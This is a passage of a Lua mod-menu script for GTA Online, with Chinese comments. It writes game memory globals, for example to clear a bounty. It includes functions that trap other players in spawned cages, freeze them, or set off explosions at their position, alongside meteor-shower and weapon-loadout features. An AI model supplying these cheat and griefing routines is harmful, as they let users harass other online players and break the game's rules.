            this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
            if this_dist < closest_dist and not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, true) and ped ~= init_ped then
                closest = ped
                closest_dist = this_dist
            end
        end
        if closest ~= nil then 
            return {closest, closest_dist}
        else
            return nil 
        end
    end
    function ycxs()
    if util.is_session_started() then
        if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then
            memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
            memory.write_int(memory.script_global(2359296 + 1 + 5149 + 13), 2880000)
            notify("移除赏金 " ..memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3) + 1)).. "$")
        else
            notify("别点了，你没有被悬赏！")
        end
    end
end    
function shake_player(pid, power)
    local entity = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 7, 0, false, true, power)
end
      function freecageg(pid)
          if cage_table[pid] then
              DelEnt(cage_table[pid])
      
              cage_table[pid] = false 
              else util.toast('No Ped Cage Found')
          end
      end
function ptlz(pid)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
    if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
        menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
        util.yield(300)
        if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
            notification("Failed to kick player out of the vehicle", colors.red)
            menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
            return
        end
        menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
        pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --if not it could place the cage at the wrong position
    end
    cage_player(pos)
end
--七度空间
function qdkj(pid)
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
local hash = 1089807209
STREAMING.REQUEST_MODEL(hash)

while not STREAMING.HAS_MODEL_LOADED(hash) do		
    util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
cages[#cages + 1] = cage_object

local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
rot.y = 90

ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
util.yield(15)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--钱笼子
function zdlz(pid)
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
local hash = util.joaat("bkr_prop_moneypack_03a")
STREAMING.REQUEST_MODEL(hash)

while not STREAMING.HAS_MODEL_LOADED(hash) do		
    util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
cages[#cages + 1] = cage_object
cages[#cages + 1] = cage_object
util.yield(15)
local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
rot.y = 90
ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--垃圾箱
function yylz(pid)
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
local hash = 684586828
STREAMING.REQUEST_MODEL(hash)

while not STREAMING.HAS_MODEL_LOADED(hash) do		
    util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
cages[#cages + 1] = cage_object
util.yield(15)
local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
rot.y = 90
ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--小车车
function cclz(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local hash = 4022605402
    STREAMING.REQUEST_MODEL(hash)

    while not STREAMING.HAS_MODEL_LOADED(hash) do		
        util.yield()
    end
    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
    cages[#cages + 1] = cage_object
    util.yield(15)

    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐
function  sdkl1(pid)

local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
local hash = 238789712
STREAMING.REQUEST_MODEL(hash)

while not STREAMING.HAS_MODEL_LOADED(hash) do		
    util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
cages[#cages + 1] = cage_object
util.yield(15)

STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐pro
function sdkl2(pid)
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
local hash = util.joaat("ch_prop_tree_02a")
STREAMING.REQUEST_MODEL(hash)

while not STREAMING.HAS_MODEL_LOADED(hash) do		
    util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
cages[#cages + 1] = cage_object
cages[#cages + 1] = cage_object
util.yield(15)

STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐promax
function sdkl3(pid)
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
local hash = util.joaat("ch_prop_tree_03a")
STREAMING.REQUEST_MODEL(hash)

while not STREAMING.HAS_MODEL_LOADED(hash) do		
    util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
cages[#cages + 1] = cage_object
cages[#cages + 1] = cage_object
util.yield()
local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
    rot.y = 90
    ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)

STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--电击笼
local spawned_objects = {}
function djlz()
    local number_of_cages = 4
    local elec_box = util.joaat("prop_elecbox_12")
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player)
    pos.z -= 0.5
    request_model(elec_box)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(2.1)
        obj_pos:add(pos)
        for offs_z = 1, 5 do
            local electric_cage = entities.create_object(elec_box, obj_pos)
            spawned_objects[#spawned_objects + 1] = electric_cage
            ENTITY.SET_ENTITY_ROTATION(electric_cage, 90, 0, angle, 2, 0)
            obj_pos.z += 0.75
            ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
        end
    end
end
--竞技管
function jjglz()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    STREAMING.REQUEST_MODEL(2081936690)

    while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
        util.yield()
    end
    local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
    cages[#cages + 1] = cage_object
    util.yield(15)
    local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
    rot.y = 90
    ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
function capitalize(txt)
	return tostring(txt):gsub('^%l', string.upper)
end
Effect = {asset = "", name = "", scale = 1.0}
Effect.__index = Effect
function Effect.new(asset, name, scale)
	local inst = setmetatable({}, Effect)
	inst.name = name
	inst.asset = asset
	inst.scale = scale
	return inst
end
function removeFxs(effects)
	for _, effect in ipairs(effects) do
		GRAPHICS.STOP_PARTICLE_FX_LOOPED(effect, 0)
		GRAPHICS.REMOVE_PARTICLE_FX(effect, 0)
	end
end
local function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
function start_meteor_shower()
    meteor_thr = util.create_thread(function(thr)
        while true do
            if not meteors then
                util.stop_thread()
            end
            local rand_1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-500, 500), math.random(-500, 500), 300.0)
            local rand_2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-500, 500), math.random(-500, 500), 0.0)
            local diff = {}
            local speed = 200
            diff.x = (rand_2['x'] - rand_1['x'])*speed
            diff.y = (rand_2['y'] - rand_1['y'])*speed
            diff.z = (rand_2['z'] - rand_1['z'])*speed
            local h = 3751297495
            request_model_load(h)
            rand_1.x = rand_1['x']
            rand_1.y = rand_1['y']
            rand_1.z = rand_1['z']
            local meteor = OBJECT.CREATE_OBJECT_NO_OFFSET(h, rand_1['x'], rand_1['y'], rand_1['z'], true, false, false)
            ENTITY.SET_ENTITY_HAS_GRAVITY(meteor, true)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(meteor, 4, diff.x, diff.y, diff.z, true, false, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(meteor, 2, diff.x, diff.y, diff.z, 0, 0, 0, 0, true, false, true, false, true)
            OBJECT.SET_OBJECT_PHYSICS_PARAMS(meteor, 100000, 5, 1, 0, 0, .5, 0, 0, 0, 0, 0)
            util.yield(100)
        end
    end)
end
function getOffsetFromCam(dist)
    local pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
    local dir = v3.toDir(CAM.GET_FINAL_RENDERED_CAM_ROT(2))
    local offset = {
        x = pos.x + dir.x * dist,
        y = pos.y + dir.y * dist,
        z = pos.z + dir.z * dist
    }
    return offset
end
local function request_ptfx_asset_lasereyes(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
local STOREDIR = filesystem.scripts_dir() .. "/lib/" .. '/cqcqlib/'
local LIBDIR = filesystem.scripts_dir() .. "lib\\cqcqlib\\"
do_autoload = false
local wpcmpTable = {}
local weapons_table = {}
if filesystem.exists(LIBDIR .. "zujianziyuan.lua") then
    wpcmpTable = require("lib.cqcqlib.zujianziyuan")
    weapons_table = util.get_weapons()
else
    util.toast("您没有正确安装资源。\n确保组件资源lua在 " .. LIBDIR .. " directory")
    util.stop_script()
end
local attachments_dict = wpcmpTable[1]
local liveries_dict = wpcmpTable[2]
function baocunwq()
    local charS,charE = "   ","\n"
    local player = players.user_ped()
    file = io.open(STOREDIR .. "loadout.lua", "wb")
    file:write("return {" .. charE)
    local num_weapons = 0
    for _, weapon in weapons_table do
        local weapon_hash = weapon.hash

        if SAVE_WEAPON.HAS_PED_GOT_WEAPON(player, weapon_hash, false) then
            num_weapons = num_weapons + 1
            if num_weapons > 1 then
                file:write("," .. charE)
            end
            file:write(charS .. "[" .. weapon_hash .. "] = ")
            --WEAPON.SET_CURRENT_PED_WEAPON(player, weapon_hash, true)
            local num_attachments = 0
            for attachment_hash, _ in attachments_dict do
                if (SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, attachment_hash)) then
                    --util.yield(10)
                    if SAVE_WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(player, weapon_hash, attachment_hash) then
                        num_attachments = num_attachments + 1
                        if num_attachments == 1 then
                            file:write("{")
                            file:write(charE .. charS .. charS .. "[\"attachments\"] = {")
                        else
                            file:write(",")
                        end
                        file:write(charE .. charS .. charS .. charS .. "[" .. num_attachments .. "] = " .. attachment_hash)
                    end
                end
            end
            local cur_tint = SAVE_WEAPON.GET_PED_WEAPON_TINT_INDEX(player, weapon_hash)
            if num_attachments > 0 then
                file:write(charE .. charS .. charS .. "},")
            else
                file:write("{")
            end
            file:write(charE .. charS .. charS .. "[\"tint\"] = " .. cur_tint)
            --- Livery
            for livery_hash, _ in liveries_dict do
                if SAVE_WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(player, weapon_hash, livery_hash) then
                    local colour = WEAPON.GET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery_hash)
                    file:write("," .. charE .. charS .. charS .. "[\"livery\"] = {")
                    file:write(charE .. charS .. charS .. charS .. "[\"hash\"] = " .. livery_hash .. ",")
                    file:write(charE .. charS .. charS .. charS .. "[\"colour\"] = " .. colour)
                    file:write(charE .. charS .. charS .. "}")
                    break
                end
            end
            file:write(charE .. charS .. "}")
        end
    end
    file:write(charE .. "}")
    file:close()
    util.toast("保存完成了！")
end

function jiazaiwq()
    if filesystem.exists(STOREDIR .. "loadout.lua") then
        player = players.user_ped()
        SAVE_WEAPON.REMOVE_ALL_PED_WEAPONS(player, false)
        SAVE_WEAPON.SET_CAN_PED_SELECT_ALL_WEAPONS(player, true)
        local loadout = require("/lib/" .. '/cqcqlib/'  .. "loadout")
        for w_hash, attach_dict in loadout do
            SAVE_WEAPON.GIVE_WEAPON_TO_PED(player, w_hash, 10, false, true)
            if attach_dict.attachments ~= nil then
                for _, hash in attach_dict.attachments do
                    SAVE_WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(player, w_hash, hash)
                end
            end
            SAVE_WEAPON.SET_PED_WEAPON_TINT_INDEX(player, w_hash, attach_dict["tint"])
            if attach_dict.livery ~= nil then
                SAVE_WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(player, w_hash, attach_dict.livery.hash)
                SAVE_WEAPON.SET_PED_WEAPON_COMPONENT_TINT_INDEX(player, w_hash, attach_dict.livery.hash, attach_dict.livery.colour)
            end
        end
        regen_menu()
        util.toast("配备装备")
        menu.trigger_commands("fillammo")
    else
        util.toast("你以前从未保存过，为什么要点这个选项 操你妈的 *.*")
    end
    package.loaded["store\\loadout"] = nil
end

function zidongjz(on)
    do_autoload = on
end

function congtouks()
    SAVE_WEAPON.REMOVE_ALL_PED_WEAPONS(players.user_ped(), false)
    regen_menu()
    util.toast("从头开始喽！")
end

function regen_menu()
    for _, weapon in weapons_table do
        if weapons_action[weapon.hash] ~= nil then
            if weapons_action[weapon.hash]:isValid() then
                weapons_action[weapon.hash]:delete()
            end
        end
    end
    weapons_action = {}
    attachments_action = {}
    weapon_deletes = {}
    cosmetics_list = {}
    tints_slider = {}
    livery_action_divider = {}
    livery_actions = {}
    livery_colour_slider = {}
    livery = {}

    for _, weapon in weapons_table do
        local category = weapon.category
        local weapon_name = util.get_label_text(weapon.label_key)
        local weapon_hash = weapon.hash
        if SAVE_WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), weapon_hash, false) then
            generate_for_new_weapon(category, weapon_name, weapon_hash, false)
        else
            weapons_action[weapon_hash] = categories[category]:action(weapon_name .. " (未配备)", {}, "配备 " .. weapon_name,
                    function()
                        weapons_action[weapon_hash]:delete()
                        equip_weapon(category, weapon_name, weapon_hash)
                    end
            )
        end
        SAVE_WEAPON.ADD_AMMO_TO_PED(players.user_ped(), weapon_hash, 10) --- if a special ammo type has been equipped.. it should get some ammo
    end
end

function equip_comp(category, weapon_name, weapon_hash, attachment_hash)
    SAVE_WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(players.user_ped(), weapon_hash, attachment_hash)
end

function equip_weapon(category, weapon_name, weapon_hash)
    SAVE_WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), weapon_hash, 10, false, true)
    util.yield(10)
    weapon_deletes[weapon_name] = nil
    generate_for_new_weapon(category, weapon_name, weapon_hash, true)
end

function generate_for_new_weapon(category, weapon_name, weapon_hash, focus)
    weapons_action[weapon_hash] = categories[category]:list(weapon_name, {}, "编辑的附件 " .. weapon_name,
            function()
                SAVE_WEAPON.SET_CURRENT_PED_WEAPON(players.user_ped(), weapon_hash, true)
                generate_attachments(category, weapon_name, weapon_hash)
            end
    )
    if focus then
        weapons_action[weapon_hash]:trigger()
    end
end

function generate_cosmetics(weapon_hash, weapon_name)
    -- clear old cosmetic stuff
    livery_action_divider = {}
    livery_colour_slider = {}
    livery = {}
    tints_slider = {}
    livery_actions = {}

    if cosmetics_list[weapon_hash] ~= nil then
        if cosmetics_list[weapon_hash]:isValid() then
            cosmetics_list[weapon_hash]:delete()
        end
        regenerated_cosmetics = true
    end
    cosmetics_list[weapon_hash] = weapons_action[weapon_hash]:list("表面", {}, "",
            function()
                local tint_count = WEAPON.GET_WEAPON_TINT_COUNT(weapon_hash)
                local cur_tint = WEAPON.GET_PED_WEAPON_TINT_INDEX(player, weapon_hash)

                if tints_slider[weapon_hash] == nil then
                    tints_slider[weapon_hash] = cosmetics_list[weapon_hash]:slider("色调", {}, "选择适合你的色调 " .. weapon_name, 0, tint_count - 1, cur_tint, 1,
                            function(change)
                                WEAPON.SET_PED_WEAPON_TINT_INDEX(player, weapon_hash, change)
                            end
                    )
                end

                --- livery colour
                local has_liveries = false
                for livery_hash, _ in liveries_dict do
                    if SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, livery_hash) then
                        has_liveries = true
                        break
                    end
                end


                if has_liveries then
                    --- get current camo component
                    for hash, _ in liveries_dict do
                        if SAVE_WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(player, weapon_hash, hash) then
                            livery[weapon_hash] = hash
                            break
                        end
                    end
                    --- livery colour slider
                    if livery_colour_slider[weapon_hash] == nil then
                        local cur_ctint_colour = WEAPON.GET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery[weapon_hash])
                        if cur_ctint_colour == -1 then cur_ctint_colour = 0 end
                        livery_colour_slider[weapon_hash] = cosmetics_list[weapon_hash]:slider("皮肤颜色", {}, "改变你的皮肤颜色", 0, 31, cur_ctint_colour, 1,
                                function(index)
                                    if livery[weapon_hash] == nil then
                                        util.toast("你的武器上没有皮肤")
                                    else
                                        SAVE_WEAPON.SET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery[weapon_hash], index)
                                    end
                                end
                        )
                    end

                    if livery_action_divider[weapon_hash] == nil then
                        livery_action_divider[weapon_hash] = cosmetics_list[weapon_hash]:divider("皮肤")
                    end
                    --- livery equip actions
                    for livery_hash, label in liveries_dict do
                        if SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, livery_hash) and livery_actions[weapon_hash..livery_hash] == nil then
                            livery_actions[weapon_hash .. livery_hash] = cosmetics_list[weapon_hash]:action(util.get_label_text(label), {}, "",
                                    function()
                                        livery[weapon_hash] = livery_hash
                                        equip_comp(category, weapon_name, weapon_hash, livery_hash)
                                        SAVE_WEAPON.SET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery[weapon_hash], livery_colour_slider[weapon_hash].value)
                                    end
                            )
                        end
                    end
                end
            end
    )
end

function generate_attachments(category, weapon_name, weapon_hash)
    if weapon_deletes[weapon_name] == nil then
        weapon_deletes[weapon_name] = weapons_action[weapon_hash]:action("删去 " .. weapon_name, {}, "",
                function()
                    SAVE_WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(), weapon_hash)
                    cosmetics_list[weapon_hash]:delete()
                    cosmetics_list[weapon_hash] = nil
                    livery_action_divider[weapon_hash] = nil
                    weapons_action[weapon_hash]:delete()

                    util.toast(weapon_name .. " 已删除")
                    weapons_action[weapon_hash] = categories[category]:action(weapon_name .. " (未配备)", {}, "配备 " .. weapon_name,
                            function()
                                for a_key, _ in attachments_action do
                                    if string.find(a_key, weapon_hash) ~= nil then
                                        attachments_action[a_key] = nil
                                    end
                                end
                                menu.delete(weapons_action[weapon_hash])
                                equip_weapon(category, weapon_name, weapon_hash)
                                weapon_deletes[weapon_name] = nil
                            end
                    )
                    weapons_action[weapon_hash]:focus()
                end
        )
    end

    local has_attachments = false
    for livery_hash, _ in attachments_dict do
        if SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, livery_hash) then
            has_attachments = true
            break
        end
    end

    if cosmetics_list[weapon_hash] == nil then
        generate_cosmetics(weapon_hash, weapon_name)
        if has_attachments then
            weapons_action[weapon_hash]:divider("附件")
        end
    end

    for attachment_hash, attachment_label in attachments_dict do
        local attachment_name = util.get_label_text(attachment_label)
        if (SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, attachment_hash)) then
            if (attachments_action[weapon_hash .. " " .. attachment_hash] ~= nil) then attachments_action[weapon_hash .. " " .. attachment_hash]:delete() end
            attachments_action[weapon_hash .. " " .. attachment_hash] = weapons_action[weapon_hash]:action(attachment_name, {}, "配备 " .. attachment_name .. " 在您的 " .. weapon_name,
                    function()
                        equip_comp(category, weapon_name, weapon_hash, attachment_hash)
                        if (string.find(attachment_label, "弹夹") ~= nil or string.find(attachment_label, "炮弹") ~= nil) and WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(players.user_ped(), weapon_hash, attachment_hash) then
                            SAVE_WEAPON.ADD_AMMO_TO_PED(players.user_ped(), weapon_hash, 10)
                        end
                    end
            )
        end
    end
end

local Openscript = "CqCqscript 启动！"
categories = {}
weapons_action = {}
attachments_action = {}
weapon_deletes = {}
cosmetics_list = {}
tints_slider = {}
livery_action_divider = {}
livery_actions = {}
livery_colour_slider = {}
livery = {}
function wancheng()
for _, weapon in weapons_table do
    local category = weapon.category
    if categories[category] == nil then
        categories[category] = wuqibaocun:list(category, {}, "编辑的武器 " .. category .. " 类别")
    end
end
regen_menu()
end
function laser_eyes()
    local weaponHash = util.joaat("weapon_heavysniper_mk2")
    local dictionary = "weap_xs_weapons"
    local ptfx_name = "bullet_tracer_xs_sr"
    local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    if PAD.IS_CONTROL_PRESSED(51, 51) then
        local inst = v3.new()
        v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
        local tmp = v3.toDir(inst)
        v3.set(inst, v3.get(tmp))
        v3.mul(inst, 1000)
        v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
        v3.add(inst, tmp)
        camAim_x, camAim_y, camAim_z = v3.get(inst)
        local ped_model = ENTITY.GET_ENTITY_MODEL(players.user_ped())
        local left_eye_id = 0
        local right_eye_id = 0
        pluto_switch ped_model do 
            case 1885233650:
            case -1667301416:
                left_eye_id = 25260
                right_eye_id = 27474
                break
            case 225514697:
            pluto_default:
                left_eye_id = 5956
                right_eye_id = 6468
        end
        local boneCoord_L = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), left_eye_id))
        local boneCoord_R = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), right_eye_id))
        if ped_model == util.joaat("mp_f_freemode_01") then 
            boneCoord_L.z += 0.02
            boneCoord_R.z += 0.02
        end
        camRot.x += 90
        request_ptfx_asset_lasereyes(dictionary)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
    end
end
read_global = {
	byte = function(global)
		local address = memory.script_global(global)
		return memory.read_byte(address)
	end,
	int = function(global)
		local address = memory.script_global(global)
		return memory.read_int(address)
	end,
	float = function(global)
		local address = memory.script_global(global)
		return memory.read_float(address)
	end,
	string = function(global)
		local address = memory.script_global(global)
		return memory.read_string(address)
	end
}
local is_player_pointing = function ()
	return read_global.int(4521801 + 930) == 3
end
write_global = {
	byte = function(global, value)
		local address = memory.script_global(global)
		memory.write_byte(address, value)
	end,
	int = function(global, value)
		local address = memory.script_global(global)
		memory.write_int(address, value)
	end,
	float = function(global, value)
		local address = memory.script_global(global)
		memory.write_float(address, value)
	end
}
TraceFlag =
{
	everything = 4294967295,
	none = 0,
	world = 1,
	vehicles = 2,
	pedsSimpleCollision = 4,
	peds = 8,
	objects = 16,
	water = 32,
	foliage = 256,
}
function get_offset_from_cam(dist)
	local rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
	local pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
	local dir = rot:toDir()
	dir:mul(dist)
	local offset = v3.new(pos)
	offset:add(dir)
	return offset
end
function get_raycast_result(dist, flag)
	local result = {}
	flag = flag or TraceFlag.everything
	local didHit = memory.alloc(1)
	local endCoords = v3.new()
	local normal = v3.new()
	local hitEntity = memory.alloc_int()
	local camPos = CAM.GET_FINAL_RENDERED_CAM_COORD()
	local offset = get_offset_from_cam(dist)

	local handle = SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
		camPos.x, camPos.y, camPos.z,
		offset.x, offset.y, offset.z,
		flag,
		players.user_ped(), 7
	)
	SHAPETEST.GET_SHAPE_TEST_RESULT(handle, didHit, endCoords, normal, hitEntity)

	result.didHit = memory.read_byte(didHit) ~= 0
	result.endCoords = endCoords
	result.surfaceNormal = normal
	result.hitEntity = memory.read_int(hitEntity)
	return result
end
local draw_line = function (start, to, colour)
	GRAPHICS.DRAW_LINE(start.x,start.y,start.z, to.x,to.y,to.z, colour.r, colour.g, colour.b, colour.a)
